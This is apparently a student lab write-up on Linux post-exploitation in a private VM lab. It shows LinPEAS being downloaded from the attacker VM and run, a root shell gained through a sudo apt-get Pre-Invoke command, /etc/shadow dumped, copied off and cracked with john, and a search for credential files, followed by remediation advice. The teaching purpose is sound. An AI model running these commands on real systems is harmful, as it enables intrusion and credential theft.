# Option 4: Post-Exploitation & Privilege Escalation

    Perform post-exploitation techniques after gaining access to a vulnerable system.
    Techniques may include privilege escalation, credential dumping, or lateral movement.
    Explain how real-world attackers use these techniques after initial compromise.
    Deliverables: Walkthrough of the escalation method, captured credentials or access verification.


# Lab Setup

1. Using two VMware machines; Kali and Ubuntu.

    On each machine I ran the following commands to grab each machines IP and performed a ping scan to ensure the machines were on the same LAN.

2. On the vuln-Ubuntu OS, I created a separate user using the following cmds:

        sudo adduser hacker

        pswd: &UJM7ujm

    ![alt text](image-16.png)
   

3. On the vuln-Ubuntu OS, I Set up SSH

        sudo apt install -y openssh-server
        sudo ufw allow 22/tcp
        sudo systemctl enable ssh
        sudo systemctl start ssh

# Step 1: Initial Access (Precondition)

- Prior to post-exploitation, access to the Ubuntu system was obtained using a standard SSH login for a low-privilege user hacker:

        ssh hacker@192.168.229.130

# Step 2: Enumeration for Privilege Escalation

- On Kali (Attacker VM), download LinPEAS:

        wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
        chmod +x linpeas.sh
        python3 -m http.server 8080

    ![alt text](image-19.png)

    
- On Ubuntu (Target VM) as `hacker`, download and run LinPEAS:

        wget http://192.168.229.131:8080/linpeas.sh
        chmod +x linpeas.sh
        ./linpeas.sh | tee linpeas_output.txt

    ![alt text](image-20.png)
    


- Key findings from enumeration

    - The hacker user was allowed to execute apt-get with sudo without a password:

            sudo -l

        Did a search of `sudo -l` in terminal of the results:

    - Output; this should be:

            (ALL) NOPASSWD: /usr/bin/apt-get

# Step 3: Exploiting the Escalation Vector

- Privilege Escalation Using apt-get Pre-Invoke

    This command executes /bin/bash as root before the apt-get update process, resulting in a root shell.

        sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash

- To confirm `root` access run the following commands and see the screenshot output

        whoami

        id

# Step 4: Post-Exploitation Tasks

Now operating as root on the Ubuntu VM, the following tasks were performed:

1. Crediential Dumping

    - Dumped the /etc/shadow file for offline password cracking:

            cat /etc/shadow > /tmp/shadow_dump

        ![alt text](image-29.png)

    - Transferred to Kali for analysis:

            scp hacker@192.168.229.130:/tmp/shadow_dump .

        ![alt text](image-28.png) ![alt text](image-30.png)

    - Cracked using john:

            john --wordlist=/usr/share/wordlists/rockyou.txt shadow_dump

        Attempted to run the command above but couldn't, as i recieved an 'no file` error for rockyou.txt.
        So I navigated to the `wordlists` folder and found that the txt file was compressed.  Ran `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` to unzip the txt file.  

        Now I was successfully able to run the command above.   

        ***JOHN OUTPUT***  Not sure why the results only list `rvaldez` and not `hacker`.

2. Sensitive File Discovery

    - Search for files containing credentials:

            find / -name "*password*" 2>/dev/null

        ![alt text](image-32.png)

    - Review command history:
        
            cat ~/.bash_history

# Conclusion

Initial Foothold: SSH access via low-privilege hacker user

Escalation Vector: Misconfigured sudo permissions allowing apt-get with no password

Post-Exploitation: Successfully gained root access, dumped credentials, and searched for sensitive files


<br><br>

# Remediation Recommendations

Restrict sudo Permissions: Remove NOPASSWD entries from non-admin users.

Monitor /etc/sudoers: Enforce least privilege and audit who can use sudo.

Credential Storage Review: Ensure sensitive credentials are not stored in plaintext or exposed via history files.

Logging & Monitoring: Implement host-based logging (e.g., auditd) to detect privilege escalation attempts.
